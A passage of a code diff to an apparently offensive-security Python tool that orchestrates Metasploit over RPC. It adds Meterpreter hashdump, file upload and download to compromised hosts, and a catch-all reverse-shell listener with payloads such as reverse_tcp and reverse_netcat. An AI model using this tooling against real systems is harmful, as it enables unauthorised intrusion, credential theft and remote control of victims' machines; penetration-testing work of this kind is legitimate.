                 "Meterpreter Quick Actions:",
                 choices=[
                     "1. Drop into Interactive Shell",
                     "2. Run 'sysinfo' and 'getuid'",
-                    "3. Attempt Hashdump"
+                    "3. Attempt Hashdump",
+                    "4. List Running Processes (ps)",
+                    "5. Upload File",
+                    "6. Download File",
                 ],
                 style=Q_STYLE
             ).ask()
@@ -488,25 +817,44 @@ class MetasploitRPCEngine:
                 console.print(shell.run_with_output('getuid'))
             elif quick_action and "Hashdump" in quick_action:
                 console.print(
-                    "[cyan][*] Attempting to dump password hashes...[/cyan]")
+                    "[cyan][*] Attempting hashdump...[/cyan]")
                 console.print(shell.run_with_output('hashdump'))
+            elif quick_action and "ps" in quick_action:
+                console.print(shell.run_with_output('ps'))
+            elif quick_action and "Upload" in quick_action:
+                local_path = questionary.text(
+                    "Local file path to upload:", style=Q_STYLE).ask()
+                remote_path = questionary.text(
+                    "Remote destination path:", style=Q_STYLE).ask()
+                if local_path and remote_path:
+                    console.print(
+                        shell.run_with_output(f'upload {local_path} {remote_path}'))
+            elif quick_action and "Download" in quick_action:
+                remote_path = questionary.text(
+                    "Remote file path to download:", style=Q_STYLE).ask()
+                local_path = questionary.text(
+                    "Local destination path:", style=Q_STYLE).ask()
+                if remote_path and local_path:
+                    console.print(
+                        shell.run_with_output(f'download {remote_path} {local_path}'))
 
         console.print(Panel(
-            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
-            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
+            f"[bold green][+] Interacting with {session_type.capitalize()} "
+            f"Session {session_id}[/bold green]\n"
+            "[dim]Type 'exit', 'quit', or 'background' to return.[/dim]",
             border_style="green"
         ))
 
         while True:
             try:
                 cmd = questionary.text(
-                    f"{session_type.capitalize()} {session_id} >", style=Q_STYLE).ask()
-
+                    f"{session_type.capitalize()} {session_id} >",
+                    style=Q_STYLE
+                ).ask()
                 if not cmd:
                     continue
                 if cmd.lower() in ['exit', 'quit', 'background']:
                     break
-
                 if session_type == 'meterpreter':
                     output = shell.run_with_output(cmd)
                     if output:
@@ -517,23 +865,103 @@ class MetasploitRPCEngine:
                     output = shell.read()
                     if output:
                         console.print(f"[white]{output}[/white]")
-
             except KeyboardInterrupt:
                 console.print(
                     "\n[yellow][*] Backgrounding session...[/yellow]")
                 break
             except Exception as e:
                 console.print(
-                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
+                    f"[bold red][!] Session error:[/bold red] {e}")
                 break
 
+    # ── Jobs ─────────────────────────────────────────────────────────────────
+
+    def manage_jobs(self):
+        jobs = self.client.jobs.list
+        if not jobs:
+            console.print("[yellow][!] No background jobs running.[/yellow]")
+            return
+
+        table = Table(title="Active MSF Background Jobs",
+                      border_style="blue", expand=True)
+        table.add_column("Job ID", style="cyan", justify="center")
+        table.add_column("Job Name", style="white")
+        for jid, jname in jobs.items():
+            table.add_row(str(jid), jname)
+        console.print(table)
+
+        target_job = questionary.text(
+            "Enter Job ID to kill (blank to cancel):", style=Q_STYLE).ask()
+        if target_job and target_job in jobs:
+            try:
+                self.client.jobs.stop(target_job)
+                console.print(
+                    f"[bold green][+] Job {target_job} terminated.[/bold green]")
+            except Exception as e:
+                console.print(f"[red][!] Failed to kill job: {e}[/red]")
+
+    # ── Catch-all listener ───────────────────────────────────────────────────
+
+    def start_listener(self):
+        lhost = ctx.get("LHOST") or "0.0.0.0"
+        lport = questionary.text(
+            "LPORT:", default="4444", style=Q_STYLE).ask() or "4444"
+
+        payload_choices = [
+            "windows/x64/meterpreter/reverse_tcp",
+            "windows/meterpreter/reverse_tcp",
+            "linux/x64/meterpreter/reverse_tcp",
+            "linux/x86/meterpreter/reverse_tcp",
+            "cmd/unix/interact",
+            "cmd/unix/reverse_netcat",
+            "php/meterpreter/reverse_tcp",
+            "java/jsp_shell_reverse_tcp",
+            "android/meterpreter/reverse_tcp",
+            questionary.Separator(),
+            "Custom (Type it manually)",
+        ]
+
+        payload = questionary.select(
+            "Select Payload for Listener:",
+            choices=payload_choices,
+            style=Q_STYLE
+        ).ask()
+        if payload == "Custom (Type it manually)":
+            payload = questionary.text(
+                "Enter exact MSF Payload path:",
+                default="windows/x64/meterpreter/reverse_tcp",
+                style=Q_STYLE
+            ).ask()
+        if not payload:
+            return
+
+        try:
+            msf_console = self._fresh_console()
+            msf_console.write("use exploit/multi/handler\n")
+            msf_console.write(f"set PAYLOAD {payload}\n")
+            msf_console.write(f"setg LHOST {lhost}\n")
+            msf_console.write(f"setg LPORT {lport}\n")
+            msf_console.write("exploit -j -z\n")
+            console.print(
+                f"[bold green][+] Listener started on {lhost}:{lport} "
+                f"(payload: {payload}) — check Jobs menu.[/bold green]")
+            time.sleep(2)
+            out = msf_console.read()
+            if out and out.get('data'):
+                console.print(f"\n[dim]{out['data'].strip()}[/dim]")
+        except Exception as e:
+            console.print(f"[red][!] Failed to start listener: {e}[/red]")
+
+    # ── Cleanup ───────────────────────────────────────────────────────────────
+
     def cleanup(self):
-        """Kills the background daemon when leaving the module."""
         if self.daemon_process:
             console.print(
                 "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
             self.daemon_process.terminate()
-            self.kill_stuck_daemon()  # Ensure it is completely dead
+            self.kill_stuck_daemon()
+
+    # ── Main loop ─────────────────────────────────────────────────────────────
 
     def run(self):
         draw_header("Metasploit RPC Orchestrator")
@@ -556,8 +984,9 @@ class MetasploitRPCEngine:
                         "3. Start Generic Catch-All Listener (Multi/Handler)",
                         "4. Active Sessions & Post-Exploitation",
                         "5. Manage Background Jobs",
-                        "Back"
-                    ], style=Q_STYLE
+                        "Back",
+                    ],
+                    style=Q_STYLE
                 ).ask()
 
                 if not choice or choice == "Back":
@@ -575,55 +1004,7 @@ class MetasploitRPCEngine:
                     self.manage_jobs()
                     questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                 elif "Listener" in choice:
-                    lhost = ctx.get("LHOST") or "0.0.0.0"
-                    lport = questionary.text(
-                        "LPORT:", default="4444", style=Q_STYLE).ask()
-
-                    payload_choices = [
-                        "windows/x64/meterpreter/reverse_tcp",
-                        "windows/meterpreter/reverse_tcp",
-                        "linux/x64/meterpreter/reverse_tcp",
-                        "linux/x86/meterpreter/reverse_tcp",
-                        "cmd/unix/interact",
-                        "php/meterpreter/reverse_tcp",
-                        questionary.Separator(),
-                        "Custom (Type it manually)"
-                    ]
-
-                    payload = questionary.select(
-                        "Select Payload for Listener:",
-                        choices=payload_choices,
-                        style=Q_STYLE
-                    ).ask()
-
-                    if payload == "Custom (Type it manually)":
-                        payload = questionary.text(
-                            "Enter exact MSF Payload path:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
-
-                    if not payload:
-                        continue
-
-                    try:
-                        msf_console = self.client.consoles.console()
-                        msf_console.write("use exploit/multi/handler\n")
-                        msf_console.write(f"set PAYLOAD {payload}\n")
-
-                        msf_console.write(f"setg LHOST {lhost}\n")
-                        msf_console.write(f"setg LPORT {lport}\n")
-                        msf_console.write("exploit -j -z\n")
-
-                        console.print(
-                            "[bold green][+] Listener started in background (Check Jobs menu).[/bold green]")
-
-                        time.sleep(2)
-                        output = msf_console.read()
-                        if output and output.get('data'):
-                            console.print(
-                                f"\n[dim]{output['data'].strip()}[/dim]")
-
-                    except Exception as e:
-                        console.print(
-                            f"[red][!] Failed to start listener: {e}[/red]")
+                    self.start_listener()
                     questionary.press_any_key_to_continue(style=Q_STYLE).ask()
         finally:
             self.cleanup()
